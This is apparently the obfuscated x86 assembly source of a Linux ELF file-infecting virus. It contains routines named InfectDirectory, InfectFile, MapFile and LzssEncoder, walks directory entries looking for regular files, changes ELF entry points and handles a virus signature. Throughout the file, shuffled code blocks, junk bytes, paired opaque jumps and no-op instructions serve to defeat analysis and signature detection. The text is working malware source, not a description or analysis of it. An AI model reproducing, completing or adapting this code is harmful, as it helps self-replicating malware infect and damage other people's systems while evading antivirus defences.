..@kHylpdEx2SIx:
    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
    jmp         $+5
db 0xe9, 0x18, 0xeb
    jmp         ..@BHwCakh56GSF
..@HS5fX5FrBnn0:
    xchg        rdx, rdx
    jmp         $+4
db 0x04, 0x29
    jmp         $+3
db 0xac
    jmp         ..@kRhPtLS5dSzG
..@RS6KbmqXq8dy:
    xchg        rbx, rbx
    jmp         $+3
db 0x04
    je          ..@lKzA66FOd7uk
    jne         ..@lKzA66FOd7uk
..@Bz40hiFJRpwP:
%ifdef X86_64
    push        rsi
%endif
    js          ..@YN7dazU0aYUz
    jns         ..@YN7dazU0aYUz
..@84SW3nfxsO3K:
    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
    jmp         $+4
db 0x7f, 0x24
    jmp         ..@g0X9jWvraNOc
..@wRdv1DEgw5H0:
    jle         ..@jO5fGnCutNi9
    jmp         $+5
db 0x82, 0x20, 0x3f
    jmp         ..@f5Z7hn1QxYvk
..@6NjuKdQAa6wh:
    push        rbx
    jmp         $+5
db 0x7b, 0xf4, 0x32
    jb          ..@OXYQCNMr4Ye9
    jae         ..@OXYQCNMr4Ye9
..@7y4SlUkcEshx:
    add         eax, 0x57
    jmp         $+4
db 0x60, 0x47
    jmp         $+4
db 0x0a, 0xd3
    jmp         ..@jXJpeEqjAuBw
..@0NWLaFyjhUHB:
    push        rax
    jmp         $+5
db 0x83, 0xdb, 0xd1
    jl          ..@6oFdptGBW2wE
    jge         ..@6oFdptGBW2wE
..@MJUJu7VVZ8aR:
    jmp         ..@TIcwmgzRqkXo
    jb          ..@Xcsq7B63ZiSR
    jae         ..@Xcsq7B63ZiSR
..@abs00nf184ZV:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    jb          ..@Cl20rxtEn41l
    jae         ..@Cl20rxtEn41l
..@ZrVTPwsvo1H5:
%ifdef X86_32
    push        rbx
%endif
    js          ..@yAnTNm2DdMxe
    jns         ..@yAnTNm2DdMxe
..@cpYi5gz6l46x:
%ifdef X86_64
    pop         rsi
%endif
    jmp         $+3
db 0xa8
    jmp         $+3
db 0x17
    jmp         $+4
db 0x8f, 0x5e
    jb          ..@eRqSKPcuzXcQ
    jae         ..@eRqSKPcuzXcQ
..@jLmkx6qzYzsu:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+5
db 0x40, 0xde, 0xf5
    jmp         ..@twLSkNc3Vzsw
..@3psOHsEM0wAE:
    xchg        rsp, rsp
    jmp         $+5
db 0x3a, 0x81, 0x74
    js          ..@M0ogjwhmjY8z
    jns         ..@M0ogjwhmjY8z
..@sDGkrlI3pxb8:
    xor         r2, r2
    jmp         $+5
db 0xc6, 0x73, 0xa3
    jmp         ..@LrsPHGEdXlFk
..@4KX0nd8vV9Rk:
    je          ..@F86lFXTQj7ym
    js          ..@BEga2hXajbqb
    jns         ..@BEga2hXajbqb
..@GTY0vu7RbldY:
    rep         nop
    jmp         $+5
db 0xe6, 0x31, 0x88
    jl          ..@rbsbcZfqblgY
    jge         ..@rbsbcZfqblgY
..@kzIdCCvrFbGr:
    jmp         ..@D464T8miEWI6
    js          ..@CcixghylXLa7
    jns         ..@CcixghylXLa7
..@qFqSZqmgNtEc:
    mov         rsi, rsi
    jmp         $+4
db 0x74, 0x80
    jmp         $+3
db 0x1f
    jmp         ..@5Ry7tKTQj69w
..@7ONu0sgfMoHg:
    xchg        rax, rax
    jmp         $+3
db 0x9e
    jb          ..@ZyMyfEmlaAfa
    jae         ..@ZyMyfEmlaAfa
..@m3SKebuPtW0I:
%ifdef X86_32
    pop         rax
%endif
    je          ..@dfMxUwyZkyxr
    jne         ..@dfMxUwyZkyxr
..@6OHeDthQXAW6:
    pop         rbx
    jmp         $+5
db 0xf0, 0xa2, 0xef
    jmp         ..@aB5cB7zClO7o
..@fy3Cn4DaBUR9:
    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
    jmp         $+3
db 0x2f
    jmp         ..@Uz7IMc2tmgsD
..@JGI6XNyFA5mf:
    pop         r5
    js          ..@L9k3h5eZzOwQ
    jns         ..@L9k3h5eZzOwQ
..@d0joBdqUoFkx:
    xchg        rdx, rdx
    jmp         $+3
db 0x38
    js          ..@Jjf98p54Gjmp
    jns         ..@Jjf98p54Gjmp
..@D1oa83Zgb3VS:
    mov         r4, 0x1
    jmp         $+4
db 0xa9, 0xd0
    jmp         ..@pZx9uHLDSUm4
..@B86LVq0SSnh0:
    xchg        rsp, rsp
    jmp         ..@0st9U2Ds2Txr
..@ILILnYVJMaub:
    mov         r2, r4
    jmp         $+5
db 0x29, 0x91, 0x04
    jmp         ..@3yDlLbEfVSyZ
..@lpmbSpuMOVdY:
    OFILE       [r1], 0x10000
    jmp         ..@wSLDTgGEU2pw
..@WV8vaHBRlyZR:
    xchg        rcx, rcx
    jb          ..@ixmcSePw9Vrh
    jae         ..@ixmcSePw9Vrh
..@miGGnLrcqPng:
    jl          ..@WTgF5iy9Lc0e
    jmp         $+5
db 0xea, 0x6a, 0xd2
    je          ..@1TJSgrT9je3l
    jne         ..@1TJSgrT9je3l
..@M0ogjwhmjY8z:
    xchg        rdi, rdi
    jmp         $+4
db 0x15, 0x56
    jmp         $+4
db 0xb9, 0x6c
    js          ..@QMLQIUdnzAnX
    jns         ..@QMLQIUdnzAnX
..@ZDYBVpMFuLP1:
    rep         movsb
    jl          ..@7vUsilhskqvl
    jge         ..@7vUsilhskqvl
..@FrMrzMB6Vhn8:
    test        r3, r3
    jmp         ..@rXKB66n7UkG4
..@1g3DudVmBrQm:
%ifdef X86_64
    xchg        rdx, rdx
%endif
    jmp         $+3
db 0x07
    js          ..@Hyy8NfHAyLvn
    jns         ..@Hyy8NfHAyLvn
..@4S9tNv6Tbn29:
    cmp         BYTE [r5], DT_REG
    jmp         ..@L9PrT3O8iOwo
..@ukW3TxgDoW4C:
    cmp         BYTE [rsp+_LZSSE_OFF.character], al
    jmp         $+4
db 0x20, 0x47
    jmp         $+4
db 0x73, 0xd1
    jmp         $+3
db 0x7d
    jmp         ..@gsFBpDNhbm4h
..@aKer3QKVYp0g:
    GGLOBAL     _signature.start
    jmp         $+5
db 0x0b, 0x12, 0x20
    jmp         ..@AKw7AUYdmOXO
..@Czm3mpwoAheB:
    mov         rsp, rsp
    jb          ..@ZmlIRFmLMvHc
    jae         ..@ZmlIRFmLMvHc
..@iV8XkfhTIW3p:
    pop         rdi
    jmp         $+4
db 0xbb, 0xa8
    jmp         $+3
db 0x15
    jl          ..@xopg9j99a2yA
    jge         ..@xopg9j99a2yA
..@P64o9k76Yrc5:
    xchg        rsp, rsp
    jl          ..@CfT8ZQe1403P
    jge         ..@CfT8ZQe1403P
..@JgHtdy0sBHI9:
    jmp         ..@onJB9s7WCkp0
    jmp         ..@gjbeQloMukOt
..@evnGDrV2xn4J:
    pop         rax
    jmp         $+4
db 0x01, 0xdf
    jmp         ..@f7tIFmabkVx6
..@iNUqmU64UCFW:
    xchg        rsp, rsp
    jmp         $+5
db 0x3c, 0xdb, 0x62
    jmp         ..@S78qN5LYiHRk
..@3Hv661zky5Dn:
    xor         r1, r1
    jmp         $+5
db 0x12, 0x52, 0x10
    jmp         $+5
db 0x04, 0x37, 0x1a
    js          ..@95CuJThqJN0S
    jns         ..@95CuJThqJN0S
..@7GyL8rEfh18h:
    call        InfectDirectory
    jmp         ..@OtL0OTHhYREi
..@KaSuBeNuD8vL:
    xchg        rdx, rdx
    jb          ..@XO2LEaSRedKg
    jae         ..@XO2LEaSRedKg
..@laYdO7PLLHxt:
    mov         r2, m5
    jb          ..@L96jClWJXhuZ
    jae         ..@L96jClWJXhuZ
..@DmTE5JCn9hAz:
    pop         rsi
    jmp         $+3
db 0xb7
    jmp         ..@AS6w2oLJkPEI
..@34rkUGCPVsfj:
    push        rsi
    jmp         $+4
db 0x40, 0x1a
    jmp         $+4
db 0xef, 0x88
    jb          ..@glygROzBRHvw
    jae         ..@glygROzBRHvw
..@b57s9zdrznFN:
    xor         rax, rax
    jmp         $+3
db 0x98
    jb          ..@cKGdMw0yz5q6
    jae         ..@cKGdMw0yz5q6
..@c0l5yBnsjMWw:
    mov         r5, r1
    jmp         ..@nKw2EH6yenOj
..@AG6QT2rmQDsX:
    pop         rdx
    jl          ..@Y07v1dpbYJgA
    jge         ..@Y07v1dpbYJgA
..@mBaueE3rZPif:
    push        rbx
    jmp         $+4
db 0xcd, 0x31
    jmp         ..@7aAA2wuvsucJ
..@fme121zSWGc2:
    je          ..@jO5fGnCutNi9
    jmp         $+4
db 0x69, 0x10
    jmp         $+4
db 0xbf, 0x41
    jmp         $+4
db 0x38, 0x13
    jmp         ..@vQE8yLnreirj
..@pofs4SfGnmzz:
    pop         rcx
    jb          ..@w0HbAGyxBalc
    jae         ..@w0HbAGyxBalc
..@16nqIbtrJGlx:
    mov         r1, rax
    jmp         $+5
db 0x27, 0x57, 0x3e
    jl          ..@2hAOwT7OEnRZ
    jge         ..@2hAOwT7OEnRZ
..@fVqxoeSl8LAw:
    cmp         bx, WORD [rsi+e_h.e_shnum]
    jmp         $+4
db 0xb1, 0x22
    jl          ..@9co4TAImKhC4
    jge         ..@9co4TAImKhC4
..@IWcCqUsTgWmd:
    pop         rcx
    js          ..@P7uoaDP1ojml
    jns         ..@P7uoaDP1ojml
..@2a7BIRO1Po7l:
    push        rsi
    jmp         $+4
db 0x8a, 0xf2
    jb          ..@ZQrdWTtdPM0p
    jae         ..@ZQrdWTtdPM0p
..@dSIip1DaP31E:
    jl          ..@uFfkLHi4ZgFg
    jl          ..@EqhZE1MKqz7R
    jge         ..@EqhZE1MKqz7R
..@fuMNughrqGmR:
    xor         rdx, rdx
    jmp         ..@kX2sbOslCZRL
..@FkrrkZtAxK6e:
    push        rdx
    jmp         $+4
db 0x02, 0xc3
    jmp         ..@S696bAhKlzqb
..@ap6i3gxk7Xxn:
    ret
    jmp         $+3
db 0xb6
    jmp         $+3
db 0x8c
    je          ..@jSxP9rQMRbn7
    jne         ..@jSxP9rQMRbn7
Memset:
    jmp         ..@FrMrzMB6Vhn8
..@BeGs152k8juK:
    push        rdx
    js          ..@0RMDGGQe5wgw
    jns         ..@0RMDGGQe5wgw
..@9WOqt66jLgha:
    xor         rax, rax
    jmp         $+4
db 0x85, 0x25
    jmp         $+5
db 0xb2, 0x86, 0x58
    jb          ..@pW5lSpLLVFv5
    jae         ..@pW5lSpLLVFv5
..@rrdYRKp9RHms:
    push        rsi
    jmp         ..@LVlWElM052uo
..@zUJxX1wOI0Rt:
    add         r5, rax
    jmp         $+4
db 0xdd, 0xd0
    jb          ..@10RRFUI0i2th
    jae         ..@10RRFUI0i2th
..@DGDfa093JnfW:
    call        Strcpy
    jmp         ..@qiHI7ldbXIlV
..@ukJSlhP6WSpz:
    xor         rbx, rbx
    js          ..@Mu0IzFOXCYt4
    jns         ..@Mu0IzFOXCYt4
..@LbVFw1zGpLUl:
    xchg        rbx, rbx
    jmp         $+3
db 0x66
    jb          ..@Gob62P6bVexR
    jae         ..@Gob62P6bVexR
..@71VYU2GWb36m:
    mov         r5, [rsp+_NBF_OFF.file]
    jb          ..@29Mx5E10tIrb
    jae         ..@29Mx5E10tIrb
..@mrY5qttxZe8z:
    mov         QWORD [rsp+_PROC_OFF.dirname], r5
    jl          ..@avv2X1ZzuqED
    jge         ..@avv2X1ZzuqED
..@bY1Bpqoe3MJp:
    jne         ..@0qpXyCftRIbn
    jmp         $+3
db 0xc0
    jmp         $+4
db 0xcb, 0x5d
    jb          ..@UVRzP2pNyV9P
    jae         ..@UVRzP2pNyV9P
..@IRMWFl3EPUTP:
    call        MemMove
    je          ..@tXPLME6pwgXu
    jne         ..@tXPLME6pwgXu
..@1HWpW15ZxcZg:
    add         rdi, rcx
    jl          ..@0Y2YDPHcYSxr
    jge         ..@0Y2YDPHcYSxr
MapFile:
    jmp         ..@Ur5xDAuJAFSP
..@0WE4tpk2G6h5:
    push        rcx
    jl          ..@VOSptoLWEDXS
    jge         ..@VOSptoLWEDXS
..@Dhl1Jk6wUfMT:
    mov         r4, r3
    jmp         $+5
db 0xff, 0x32, 0x04
    jmp         ..@6eFCN59YyKiE
..@lfpcXRl0jLuV:
    pop         r4
    jb          ..@1tupbQcyi0Rw
    jae         ..@1tupbQcyi0Rw
..@L1Ir4OjJs2f8:
    push        rdi
    jmp         $+4
db 0xda, 0xc7
    je          ..@eCcUSo79cIHA
    jne         ..@eCcUSo79cIHA
..@AwBaAAJY4QmG:
%ifdef X86_64
    pop         rdi
%endif
    jl          ..@sYCoCUnQDlvQ
    jge         ..@sYCoCUnQDlvQ
..@uFfkLHi4ZgFg:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jmp         $+5
db 0x18, 0x09, 0xa9
    jl          ..@0qpXyCftRIbn
    jge         ..@0qpXyCftRIbn
..@ceJ2AyOdXS8j:
    xchg        rax, rax
    jb          ..@rFZsUYmkFWYg
    jae         ..@rFZsUYmkFWYg
..@m6gz71FskrGV:
    push        rdi
    jmp         $+3
db 0xcb
    jmp         ..@Q82rCxmAiN5r
..@gFYI2P8briir:
    mov         rcx, rcx
    js          ..@KhF0aNr5yePF
    jns         ..@KhF0aNr5yePF
..@rcVN1ghEfc3h:
    pop         r5
    jmp         $+4
db 0x98, 0xe5
    jmp         ..@JdhpUpvP2IqU
..@KNlyKZgRTU65:
    push        rcx
    jl          ..@hBk8yflc7xLc
    jge         ..@hBk8yflc7xLc
..@NwTFznuAfqbO:
    jge         ..@r2UmSb8nTjhn
    je          ..@RI3KZjaQANlf
    jne         ..@RI3KZjaQANlf
..@QT9nILgvqWsf:
    mov         rax, 1
    jmp         $+4
db 0x94, 0x56
    jmp         $+5
db 0xc3, 0xc2, 0x02
    jmp         $+4
db 0xd4, 0x60
    js          ..@9JOFcY9jBxnc
    jns         ..@9JOFcY9jBxnc
..@INxWanVi5Nbg:
    ret
    jmp         $+5
db 0x69, 0xda, 0xbc
    je          IsNum
    jne         IsNum
..@CcixghylXLa7:
    xor         rax, rax
    jmp         ..@0KZFtn63Nm14
..@6hatZTDgzDG2:
    ret
    jmp         InfectFile
..@VOSptoLWEDXS:
    pop         rcx
    jmp         ..@nnxl2yJ1SV5L
..@1UUtf6BjdyZ3:
    call        LzssEncoder
    jmp         $+5
db 0x17, 0xfe, 0x25
    jb          ..@8Y8684h13CIs
    jae         ..@8Y8684h13CIs
..@5q4SIXrB3FVP:
    xchg        rcx, rcx
    jl          ..@TZCOFjICv9Fv
    jge         ..@TZCOFjICv9Fv
..@Aq8zPSMiHkTu:
    add         r4, 1
    jmp         $+3
db 0x50
    jmp         $+5
db 0xe5, 0x64, 0xe7
    jb          ..@c64EclQjB4Nb
    jae         ..@c64EclQjB4Nb
..@Fk7qc2ysqsvV:
    push        rcx
    jb          ..@nFVORB8oPW7p
    jae         ..@nFVORB8oPW7p
..@YRPtHNW5hy1P:
    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+5
db 0xbc, 0xe6, 0x5c
    jmp         $+4
db 0xe1, 0xc1
    jmp         ..@lZn0AOVgqsa7
..@WmQgT3p0paIG:
    push        rdx
    jmp         ..@o2ZAvokTtD4W
..@1TaIW1fl6e9v:
    jl          ..@E8mcsleMiRJz
    jmp         $+5
db 0xe9, 0x0d, 0xf9
    jmp         $+5
db 0x52, 0x52, 0x75
    jmp         ..@CnaE2HuIPgbv
..@EbAncEZeLtaP:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+3
db 0x73
    jmp         $+3
db 0x84
    jmp         $+4
db 0xc0, 0x1c
    js          ..@8ZPzrEbYa0RG
    jns         ..@8ZPzrEbYa0RG
..@DaASiDJhzjjk:
    add         rsp, _NBF_OFF_size
    jb          ..@ap6i3gxk7Xxn
    jae         ..@ap6i3gxk7Xxn
..@ceGimLVtZDWG:
    mov         rdi, rdi
    jmp         ..@WNZ5t4ZPTbbl
..@hcrxeQu7QKbF:
    pop         rax
    js          ..@5zXwNCW6oK1n
    jns         ..@5zXwNCW6oK1n
..@lMfa70ICqJmb:
    mov         r3, rax
    jmp         ..@SdOCx5gUs3dv
..@xopg9j99a2yA:
    ret
    js          UnmapFile
    jns         UnmapFile
..@Bl7MWm2FCKoT:
    rep         nop
    jmp         $+5
db 0x59, 0x77, 0x0c
    js          ..@hQ7vK9Jz0Dxp
    jns         ..@hQ7vK9Jz0Dxp
..@Tbz2cSIYIMIE:
    push        rbx
    jmp         $+5
db 0x27, 0xfc, 0x96
    jl          ..@fVIoxyvwGP06
    jge         ..@fVIoxyvwGP06
..@v0dWy6cu6c5J:
    mov         rbx, rbx
    js          ..@09Te6NqEn7ul
    jns         ..@09Te6NqEn7ul
..@jlfu6lU4h06o:
    sub         rsi, m6
    jmp         $+3
db 0xf5
    jmp         ..@oaKBorleslB7
..@5DADqi2SHIZb:
    mov         rcx, rcx
    jmp         ..@wGTbIfFnv5Hh
..@rbsbcZfqblgY:
    sub         rcx, rax
    jmp         ..@hsqZUyXiP5iL
..@U8VXANJIxsYT:
    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
    jmp         $+5
db 0x20, 0x97, 0xc2
    jmp         ..@THpuejmJQnNM
..@oHPhq9tLoUIK:
    pop         rbx
    jb          ..@ZSIlP9lw2uJK
    jae         ..@ZSIlP9lw2uJK
..@WVFQeXYBPFjj:
    push        rdx
    jmp         ..@Vf9enwtiIybr
..@Jn2jX18Mbdha:
    push        rbx
    jl          ..@JOow0reITL5x
    jge         ..@JOow0reITL5x
..@DFdOLobD09tT:
    pop         rbx
    jl          ..@KPwGTYdbJXMu
    jge         ..@KPwGTYdbJXMu
..@OqRlU2gHhiKd:
    mov         DWORD [r5+file.filefd], eax
    jmp         ..@DIaBpodMfr0C
..@ToBZYMgeeWPM:
    mov         ax, WORD [r1+linux_dirent.d_reclen]
    jmp         $+5
db 0x2d, 0xf7, 0xd4
    jmp         $+4
db 0x0f, 0x3c
    jl          ..@oCTV4ZNupbda
    jge         ..@oCTV4ZNupbda
..@Gv4vauugMfhD:
    push        rsi
    jmp         ..@DmTE5JCn9hAz
..@4WnrQA17zavb:
    push        rbx
    jmp         $+5
db 0x69, 0x2b, 0xa2
    jl          ..@vzVGoKvWC2JR
    jge         ..@vzVGoKvWC2JR
..@C5rM6lbjp7GY:
    mov         rax, rax
    jmp         ..@2Ykzv5mNjePZ
..@WjhxTmPYxRBm:
    push        rsi
    jmp         $+3
db 0x3e
    jmp         $+4
db 0x49, 0xf3
    je          ..@NCpFPe12a2j7
    jne         ..@NCpFPe12a2j7
..@Vf9enwtiIybr:
    xchg        rdx, rdx
    jl          ..@uQ0edOR9tgXY
    jge         ..@uQ0edOR9tgXY
..@nDF9W8AMvZ7F:
%ifdef X86_32
    xchg        rcx, rcx
%endif
    jmp         $+4
db 0x93, 0xbf
    jmp         $+3
db 0x8c
    js          ..@v8AxV0PmpSlZ
    jns         ..@v8AxV0PmpSlZ
..@lAjLEEn3mkAg:
    pop         rbx
    jl          ..@zUtRydTX2Zss
    jge         ..@zUtRydTX2Zss
..@1FW0xHKSdru7:
    mov         rcx, rcx
    jmp         $+5
db 0xd0, 0x28, 0xc9
    jmp         $+4
db 0x6f, 0x89
    jmp         $+5
db 0xa5, 0x09, 0x5e
    js          ..@Iqu5gxM2bBgm
    jns         ..@Iqu5gxM2bBgm
..@oxZwphW9L8ye:
    mov         rsp, rsp
    jmp         $+3
db 0x61
    je          AddSizeMappedFile
    jne         AddSizeMappedFile
..@c3Famlbx1rX9:
    push        rcx
    jmp         $+5
db 0xe3, 0xa2, 0xd6
    js          ..@dB3Jq2cBpkC9
    jns         ..@dB3Jq2cBpkC9
..@KCRdhtzZhq0I:
    mov         ecx, signature_len
    jb          ..@g41r5rBYE6n0
    jae         ..@g41r5rBYE6n0
..@W3y5v9uwA7Kn:
    pop         rbx
    jl          ..@gANopjKEe4st
    jge         ..@gANopjKEe4st
..@4L8db9BLl0Nf:
    xchg        rsi, rsi
    js          ..@falxSMCF8nQA
    jns         ..@falxSMCF8nQA
..@Q82rCxmAiN5r:
    pop         rdi
    je          ..@HGwcnZgZeNYl
    jne         ..@HGwcnZgZeNYl
..@w1SDMSglxPq4:
    mov         rcx, rcx
    jmp         $+3
db 0x6c
    jb          ..@NSDd0SyYe21v
    jae         ..@NSDd0SyYe21v
..@VrZED58zN41c:
    mov         r1, QWORD [r5+file.filesize]
    jmp         $+4
db 0x6e, 0x84
    jmp         ..@K6ayrxfgfSg2
..@Pj1tMNMSzZcL:
    sub         r4, QWORD [r1+e_h.e_entry]
    jmp         $+5
db 0x80, 0xda, 0xc9
    jmp         $+5
db 0xf9, 0xfa, 0xbe
    je          ..@flrd3ZpZUcGv
    jne         ..@flrd3ZpZUcGv
..@MoQmJQgrqll3:
%ifdef X86_64
    mov         rcx, rdx
%endif
    jmp         $+3
db 0x15
    jmp         $+4
db 0x2f, 0x53
    jb          ..@VuXaNcJ5etRr
    jae         ..@VuXaNcJ5etRr
..@ZwSuzT6KTVoQ:
    mov         QWORD [r5+file.filesize], r3
    jl          ..@OnCu9N8ByddC
    jge         ..@OnCu9N8ByddC
..@fX4VttTD6iq6:
    xchg        rbx, rbx
    js          ..@KzAGNWH03MVu
    jns         ..@KzAGNWH03MVu
..@CQHxVBhIZoSs:
    pop         rdi
    jmp         ..@il5adnQe89h5
..@moNtBzBBsdcx:
    mov         rax, rax
    jmp         $+3
db 0x3b
    je          ..@fqlHuUQvWp1A
    jne         ..@fqlHuUQvWp1A
..@N7OWe05YZouQ:
    add         rsp, _VADDR_OFF_size
    jmp         $+5
db 0xa9, 0x07, 0x80
    jmp         $+5
db 0x8c, 0xfc, 0xa0
    jb          ..@S9Ap61lvADgS
    jae         ..@S9Ap61lvADgS
..@ton2Lq8i6JZF:
    mov         al, BYTE [rdi]
    jmp         ..@KpkTYLotlJtb
..@pSwFdok9ms2l:
    pop         r3
    jmp         $+3
db 0x10
    jl          ..@TrM183CIJA3L
    jge         ..@TrM183CIJA3L
..@ldeyaI5nbK4C:
    xchg        rsi, rsi
    jmp         $+3
db 0xd5
    jmp         ..@7QhXQTkQXJh6
..@y39vSGSFD2yn:
    add         r2, r1
    jmp         $+4
db 0x73, 0x0c
    jmp         $+3
db 0x5e
    js          ..@1wkJFAeJ6iMA
    jns         ..@1wkJFAeJ6iMA
..@CnSUqmnXUhQ1:
    rep         nop
    je          ..@eeD7TKy25Tau
    jne         ..@eeD7TKy25Tau
..@u4TG03ZLzMMQ:
    mov         ecx, WINDOW_LENGTH
    je          ..@s6fmdXWIB61s
    jne         ..@s6fmdXWIB61s
..@XhgEz5yKm1g4:
    xor         rax, rax
    jmp         $+3
db 0xff
    jl          ..@G46qxwCIub70
    jge         ..@G46qxwCIub70
..@KH56JO7hOzLA:
    jl          ..@RyaVC0l8quEd
    js          ..@w5l8UJ1y16Uy
    jns         ..@w5l8UJ1y16Uy
..@BQD45wvayTti:
    push        rax
    jmp         $+5
db 0xae, 0x8f, 0xba
    jl          ..@Z5Z5Lwo4aJdr
    jge         ..@Z5Z5Lwo4aJdr
..@5jMyfTBOcbh3:
%ifdef X86_64
    xor         rdx, rdx
%endif
    jmp         ..@wf7IW6Qivu49
..@9SmCxZ3Y0O4f:
    rep movsb 
    jmp         $+5
db 0xe8, 0x7a, 0x7e
    js          ..@onJB9s7WCkp0
    jns         ..@onJB9s7WCkp0
..@cedRKO7eAXOR:
%ifdef X86_32
    mov         esi, r2
%endif
    jmp         $+5
db 0x8e, 0x10, 0x54
    jmp         $+3
db 0x45
    je          ..@v4Jko2lJxItK
    jne         ..@v4Jko2lJxItK
..@xLfJkvJJudHX:
    pop         rsi
    jmp         $+5
db 0x9e, 0x48, 0xb2
    js          ..@r2IRAvzAFDTL
    jns         ..@r2IRAvzAFDTL
..@Bsy8DtvAxi0e:
%ifdef X86_64
    pop         rsi
%endif
    jb          ..@TzKu0EBedFSp
    jae         ..@TzKu0EBedFSp
..@S3CylWQmg3av:
    pop         rbx
    je          ..@sbRlz6Hnvhaz
    jne         ..@sbRlz6Hnvhaz
..@xkdxBuA6NXd6:
    mov         rbp, rbp
    jmp         $+3
db 0x15
    jl          ..@m6gz71FskrGV
    jge         ..@m6gz71FskrGV
..@YDkvT2QMhpTT:
    pop         rdi
    jmp         $+4
db 0x43, 0x3f
    jb          ..@9tjpJLjLN4z2
    jae         ..@9tjpJLjLN4z2
..@99zQbxQa7rQr:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+4
db 0xab, 0x1b
    jmp         $+4
db 0xea, 0x9e
    jmp         ..@29Hq5Zo3fuQd
..@5rO8wKQLBxUN:
    pop         rdi
    je          ..@WAhlmBMC0ftp
    jne         ..@WAhlmBMC0ftp
..@YDfFZXtQKVMy:
    mov         rdi, rdi
    jmp         $+5
db 0x05, 0x25, 0x98
    js          ..@DjM5W8nZYQUy
    jns         ..@DjM5W8nZYQUy
..@gYD595nS0Bb4:
%ifdef X86_64
    push        rdi
%endif
    je          ..@sHPoOKVZYBqQ
    jne         ..@sHPoOKVZYBqQ
..@LlBEQaraNGPD:
    xor         rax, rax
    jmp         $+4
db 0x61, 0x41
    jmp         ..@F8tmJLGX3XfR
..@cxU7csbqfmWy:
    push        rdx
    jmp         $+4
db 0xea, 0xc2
    jmp         $+3
db 0x2a
    jmp         ..@AG6QT2rmQDsX
..@Lxo0TYmFuZum:
    xor         rcx, rcx
    jmp         ..@u4TG03ZLzMMQ
..@Obb5SZM8eLxh:
    pop         rsi
    jmp         $+5
db 0x33, 0x65, 0x54
    jmp         ..@D8FRE0PlQE16
..@Em6LgF5e0QaA:
    push        rdx
    jmp         $+5
db 0x63, 0xb8, 0x8f
    jmp         $+4
db 0xc5, 0x4a
    jmp         $+4
db 0x04, 0x14
    jl          ..@dz9ONzXzcK4G
    jge         ..@dz9ONzXzcK4G
..@Zvn2E93LOpnH:
    mov         rax, rdi
    jmp         $+5
db 0x19, 0x32, 0xfb
    jmp         $+4
db 0x16, 0x92
    jmp         $+4
db 0xd3, 0x6f
    jmp         $+5
db 0xef, 0x31, 0xe9
    jmp         ..@INxWanVi5Nbg
..@Laci6jzCvQ8M:
    xchg        rax, rax
    jmp         $+4
db 0x0f, 0x45
    je          ..@NsdtMV6xIt1h
    jne         ..@NsdtMV6xIt1h
..@mobD4lUIYrd6:
    cmp         QWORD m6, 0x00
    jmp         $+4
db 0xf8, 0xa4
    jmp         ..@4L8db9BLl0Nf
..@SB5cWr5BIA6a:
    xchg        rax, rax
    jmp         ..@INZGaU5euTpX
..@nl6xvnOOfQJH:
    pop         rax
    js          ..@g1jdaTjlgqpW
    jns         ..@g1jdaTjlgqpW
..@sn8rsSRAJfm3:
    mov         rcx, signature_len
    jl          ..@TmsoCiyq9i0W
    jge         ..@TmsoCiyq9i0W
..@jxyZtT2pVq4p:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+5
db 0x97, 0x4d, 0xe0
    je          ..@jXUXD8EwZfe7
    jne         ..@jXUXD8EwZfe7
..@uztz9NLZpp0g:
    jmp         ..@DxBnvS7E3dT0
    jl          ..@p1yWmLLBwLYl
    jge         ..@p1yWmLLBwLYl
..@ACzNTp75A5DF:
    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    jmp         $+4
db 0x60, 0xfb
    jmp         $+3
db 0x05
    jmp         ..@uBYfTDYUw6cM
..@3KaFYUHEPjZp:
    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
    jl          ..@i2cerblToEnf
    jge         ..@i2cerblToEnf
..@1fKnr6QgYO2t:
    xchg        rsp, rsp
    jmp         $+4
db 0xc0, 0xbd
    jmp         $+5
db 0xbe, 0xf4, 0xf3
    jb          ..@kcGQjrcLk0MJ
    jae         ..@kcGQjrcLk0MJ
..@nfS6vT2E0O32:
    mov         r3, rax
    jmp         $+4
db 0x18, 0x2b
    jmp         $+4
db 0x93, 0x54
    jmp         $+3
db 0x42
    jl          ..@NxLk6fMVoe17
    jge         ..@NxLk6fMVoe17
..@zucue1lgxYPK:
    push        rdx
    jl          ..@HY1fwXfJ3Xot
    jge         ..@HY1fwXfJ3Xot
..@CJ2wd4f8vEK6:
    jge         ..@PLvvPxLXxPRP
    jb          ..@HS5fX5FrBnn0
    jae         ..@HS5fX5FrBnn0
..@EUd8tN6Lq7Cf:
    push        r2
    jmp         $+4
db 0x49, 0x08
    jmp         $+4
db 0xf1, 0x09
    js          ..@0V72s3HcSKov
    jns         ..@0V72s3HcSKov
..@T5GXAs4qt0Aj:
    rep         movsb
    jl          ..@bAQO9xhQiQ9O
    jge         ..@bAQO9xhQiQ9O
..@wqB8pQGZfDJU:
    xor         r4, r4
    jmp         ..@qXPqxfl7whJU
..@o2ZAvokTtD4W:
    pop         rdx
    jl          ..@51Gxi6ZEqzuH
    jge         ..@51Gxi6ZEqzuH
..@qXPqxfl7whJU:
    rep         nop
    jmp         $+3
db 0x5f
    jmp         ..@RyaVC0l8quEd
..@11FQdbsb8fOY:
    xchg        rax, rax
    jmp         ..@PumgHYKh6RA9
..@lKiuk8ik8w5S:
    push        r5
    jmp         ..@rrdYRKp9RHms
..@paJ8d6mzAuNm:
    mov         rdi, m7
    jmp         ..@hEkErqvai97d
..@5KrnkKp8hr6s:
    pop         rbx
    jmp         $+3
db 0x15
    jb          ..@sIGjlHk882MO
    jae         ..@sIGjlHk882MO
..@UV9gA4lDeRCx:
    pop         rax
    jmp         ..@wpA1jlaTmoel
..@TzKu0EBedFSp:
%ifdef X86_64
    push        rcx
%endif
    jmp         $+3
db 0x10
    jb          ..@jzKCVvzhoxpz
    jae         ..@jzKCVvzhoxpz
